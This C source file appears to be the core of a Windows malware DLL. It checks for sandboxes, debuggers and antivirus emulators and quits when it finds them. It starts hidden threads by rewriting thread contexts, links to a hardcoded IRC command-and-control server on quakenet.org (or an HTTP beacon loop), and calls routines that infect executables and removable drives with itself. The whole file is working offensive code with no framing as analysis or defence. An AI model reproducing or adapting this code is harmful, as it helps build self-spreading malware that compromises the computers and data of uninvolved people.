#include "compat.h"
#include "log.h"
#include "utils.h"
#include "file.h"
#include "mem.h"
#include "pe_infect.h"
#include "aes.h"
#include "crypt.h"
#include "crypt_strings.h"
#include "xor_strings_gen.h"
#include "loader.h"
#ifdef _ENABLE_IRC
#include "irc.h"
#else
#include "http.h"
#endif

/* TODO: https://www.apriorit.com/dev-blog/367-anti-reverse-engineering-protection-techniques-to-use-before-releasing-software */

static DWORD
sandboxCheck_00(DWORD dllBaseAdr)
{
    // dllBaseAdr-0x1 should be an invalid HANDLE
    _CloseHandle((HANDLE)(dllBaseAdr-0x1)); // see https://msdn.microsoft.com/en-us/library/windows/desktop/ms724211(v=vs.85).aspx
    return (_GetLastError() == ERROR_INVALID_HANDLE);
}

static DWORD
debugCheck_00(DWORD dllBaseAdr)
{
    // see https://books.google.de/books?id=DhuTduZ-pc4C&pg=PA353&lpg=PA353&dq=outputdebugstring+error+code&source=bl&ots=3dkMSmS5cu&sig=ZuCXfiHmd94q1KQgdBIRiPS_uPE&hl=en&sa=X&ved=0ahUKEwj2v97bpPHQAhVFSBQKHRbaAaMQ6AEISjAG#v=onepage&q=outputdebugstring%20error%20code&f=false
    DWORD errorValue = 0xdeadbabe;
    _SetLastError(errorValue);
    char* tmp = __genGarbageFormatStr(512);
    _OutputDebugString(tmp);
    free(tmp);
    return dllBaseAdr;
}

/* bypass Emulation based AV's: https://www.blackhat.com/docs/us-14/materials/us-14-Mesbahi-One-Packer-To-Rule-Them-All-WP.pdf */
static DWORD
emu_bypass_fs2(void)
{
    DBUF(COUNTER_KERNEL32_ENUM, __fakeLibKernel32);
    DBUF(COUNTER_UNKNOWNLIB_ENUM, __unknownLib);

    HMODULE libPtr = _LoadLibrary((LPCSTR)__fakeLibKernel32);
    if (libPtr == NULL) return 0;
    libPtr = _LoadLibrary((LPCSTR)__unknownLib);
    if (libPtr != NULL) return 0;
    char* libRnd = __genRandAlphaNumStr(10);
    libRnd[9] = 'L';
    libRnd[8] = 'L';
    libRnd[7] = 'D';
    libRnd[6] = '.';
    libPtr = _LoadLibrary(libRnd);
    COMPAT(free)(libRnd);
    if (libPtr != NULL) return 0;
    return 1;
}

/* see: https://github.com/Neosama/AntiSandBox-with-Drivers/blob/master/lib.h */
static BOOL AntiSandbox_Drivers(void)
{
    DBUF(DXGKRNL_ENUM, __dxgkrnl);
    DBUF(NWIFI_ENUM, __nwifi);
    DBUF(KSTHUNK_ENUM, __ksthunk);
    DBUF(VWIFIFLT_ENUM, __vwififlt);
    LPVOID drivers[1024];
    DWORD cbNeeded;
    int cDrivers, i;
    int score = 0;

#ifdef _PRE_RELEASE
    COMPAT(printf)("AntiSandbox: %s, %s, %s, %s\n", __dxgkrnl, __nwifi, __ksthunk, __vwififlt);
#endif
    if (_EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
        TCHAR szDriver[1024];
        cDrivers = cbNeeded / sizeof(drivers[0]);
        for (i = 0; i < cDrivers; i++) {
            if (_GetDeviceDriverBaseNameA(drivers[i], szDriver, sizeof(szDriver) / sizeof(szDriver[0]))) {
                if (COMPAT(strnicmp)(szDriver, __dxgkrnl, sizeof __dxgkrnl) == 0) {
                    score++;
                }
                if (COMPAT(strnicmp)(szDriver, __nwifi, sizeof __nwifi) == 0) {
                    score++;
                }
                if (COMPAT(strnicmp)(szDriver, __ksthunk, sizeof __ksthunk) == 0) {
                    score++;
                }
                if (COMPAT(strnicmp)(szDriver, __vwififlt, sizeof __vwififlt) == 0) {
                    score++;
                }
            }
        }
    }

    if (score >= 2)
        return TRUE;

    return FALSE;
}

__volatile__ __stdcall void* _main(void* kernel32, void* getProcAdr, void* dllBaseAdr, const struct loader_x86_data* ldr_orig, void* real_dllptr) __asm__("__main");

static DWORD dwRelocDiff = 0;

static BOOL startThread(HANDLE* phThread, LPTHREAD_START_ROUTINE threadFunc)
{
    if (*phThread == NULL) {
        _SetLastError(0);
        *phThread = _CreateThread(NULL, 0, threadFunc, NULL, CREATE_SUSPENDED, NULL);
        if (!*phThread)
            return FALSE;
        if (*phThread == INVALID_HANDLE_VALUE) {
            LOG_MARKER;
            return FALSE;
        } else {
            CONTEXT thrdCtx;
            thrdCtx.ContextFlags = CONTEXT_FULL;
            _GetThreadContext(*phThread, &thrdCtx);
            thrdCtx.Eip = (DWORD)threadFunc;
#ifdef _PRE_RELEASE
            COMPAT(printf)("Thread %p: Set Thread EIP to 0x%p\n", *phThread, thrdCtx.Eip);
#endif
            thrdCtx.ContextFlags = CONTEXT_CONTROL;
            _SetThreadContext(*phThread, &thrdCtx);
            _ResumeThread(*phThread);
        }
    }
    return TRUE;
}

static HANDLE hThread = NULL, hNetThread = NULL;

/* Do not use lpParams (broken CreateThread and this is not a valid Windows module! */
static DWORD WINAPI __attribute__((noreturn)) __thread_net(LPVOID lpParams)
{
    (void)lpParams;
    do {
        _SwitchToThread(); /* wait until main thread setup all stuff */
        _WaitForSingleObject(hNetThread, 10000);
    }
#ifdef _ENABLE_IRC
    while (initSocket(_LoadLibrary, _GetProcAddress) != 0);
#else
    while (initHttp(_LoadLibrary, _GetProcAddress) != 0);
#endif

    while (1) {

#ifdef _ENABLE_IRC
        if (ircLoop("muzzling", "#blkhtm", "dreamhack.se.quakenet.org", "6667") == 0) {
            shutSocket();
        }
#ifdef _PRE_RELEASE
        COMPAT(printf)("%s\n", "irc: ERROR");
#endif
#else
        //sendWeb2Tor("/", "GET", NULL, 0); /* testing only */
        httpLoopAtLeastOnce();
        uint32_t npt = getNextPingTime();
        _WaitForSingleObject(hNetThread, (npt > 0 ? npt*1000 : 60000));
#endif
    }
}

/* Do not use lpParams (broken CreateThread and this is not a valid Windows module! */
static DWORD WINAPI __attribute__((noreturn)) __thread_main(LPVOID lpParams)
{
    /* TODO: SetUnhandledExceptionFilter */
    /* Main Thread, Main Loop */
    (void)lpParams;
    while (1) {
        /* NOTE: At this point dllBaseAdr should always the same as real_dllptr. */
        /* NOTE: Param dllBaseAdr must be NULL, so _main knows it is already rebased! */
        _main(NULL, NULL, NULL, getOrigLoader(), NULL);
        _WaitForSingleObject(hThread, 5000);
    }
}

__volatile__ __stdcall void* _main(void* kernel32, void* getProcAdr, void* dllBaseAdr, const struct loader_x86_data* ldr_orig, void* real_dllptr)
{
    /* Abort, if not started by own loader/base. */
    /* (e.g. loaded with LoadLibrary/loadmodule) */
    if (!ldr_orig)
        return NULL;

    {
        void* dllSectionAdr = (void*)ldr_orig->ptrToDLL;
        uint32_t dllSize = ldr_orig->sizOfDLL;

        /* IMAGE REBASING */
        if (dllBaseAdr && (DWORD)dllBaseAdr != _MILLER_IMAGEBASE) {
            dwRelocDiff = dwDoRebase((real_dllptr ? real_dllptr : dllSectionAdr), dllSize, dllBaseAdr);
            if (!dwRelocDiff) return NULL;
        } else if (!dllBaseAdr) {
            /* came from __thread_main(...) */
            dllBaseAdr = (void*)getImageBase();
        }

        /* _main called by Thread? */
        if (hThread != NULL) {
            goto _THREAD_STARTED;
        }

        setOrigLoader(ldr_orig);
        EMBED_BREAKPOINT;
        if (!kernel32 || !getProcAdr) return NULL;
        EMBED_BREAKPOINT;
        setSectionAdr((DWORD)dllSectionAdr);
        setImageBase((DWORD)dllBaseAdr);
        setImageSize(dllSize);
        EMBED_BREAKPOINT;
        if (!bInitCompat(kernel32, getProcAdr)) return NULL;

#ifdef _PRE_RELEASE
        COMPAT(printf)("%s\n", "AntiAV / AntiDbg");
#endif
        /* anti av && anti debug */
        if (!sandboxCheck_00(getImageBase()))
            return NULL;
        EMBED_BREAKPOINT;
        if (!debugCheck_00(getImageBase()))
            return NULL;
        if (!emu_bypass_fs2())
            return NULL;
        if (AntiSandbox_Drivers())
            return NULL;

        /* decrypted dll? if yes, free decrypted dll binary */
        if (real_dllptr && (void*)ldr_orig->ptrToDLL != real_dllptr) {
            _VirtualFree(real_dllptr, 0, MEM_RELEASE);
        }

#ifdef _PRE_RELEASE
        COMPAT(printf)("%s\n", "Starting Threads ..");
#endif
        /* Start Main DLL Thread */
        if (hThread == NULL) {
            if (!startThread(&hThread, __thread_main)) {
                LOG_MARKER;
            } else {
/*
#ifdef _PRE_RELEASE
                _WaitForSingleObject(hThread, INFINITE);
#endif
*/
            }
        }
        if (hNetThread == NULL) {
            if (!startThread(&hNetThread, __thread_net)) {
                LOG_MARKER;
            } else {
/*
#ifdef _PRE_RELEASE
                _WaitForSingleObject(hNetThread, INFINITE);
#endif
*/
            }
        }
#ifdef _PRE_RELEASE
        COMPAT(printf)("%s\n", "Returning to original execution flow.");
#endif
        return hThread;
    }

_THREAD_STARTED:

    /* dwRelocDiff != 0 if relocated */
    if (dwRelocDiff) {
    }
    aes_init();

#ifdef _EXTRA_VERBOSE
    SIZE_T ldrsiz = 0;
    BYTE* ldr = getLoader(&ldrsiz);
    printf("Loader: 0x%p\n", ldr);
    printf("Loader size: %u (0x%p)\n", getRealLoaderSize(), getRealLoaderSize());
    printf("Loader content: ");
    __printByteBuf(ldr, getRealLoaderSize());
    printf("Running PRE-Release: _main(...) -> %p\n", _main);
    printf("ImageBase........: 0x%p\n"
           "ImageSize........: 0x%p\n"
           "SectionAdr.......: 0x%p\n"
           "RelocDiff........: 0x%p\n",
           getImageBase(), getImageSize(), getSectionAdr(), dwRelocDiff);

    COMPAT(free)(ldr);
#endif

#ifdef _INFECT_DUMMY
    char* file = "dummy.exe";
#ifdef _PRE_RELEASE
    printf("Infecting File: %s\n", file);
#endif
    if (bInfectWithMyself(file))
    {
#ifdef _PRE_RELEASE
        puts("Infection done.\n");
#endif
    }
#ifdef _PRE_RELEASE
    else puts("Infection failed.\n");
#endif
#endif

#ifndef _INFECT_DUMMY
    dwInfectRemovables();
#endif
    aes_cleanup();
    return (void*)0xdeadc0de;
}

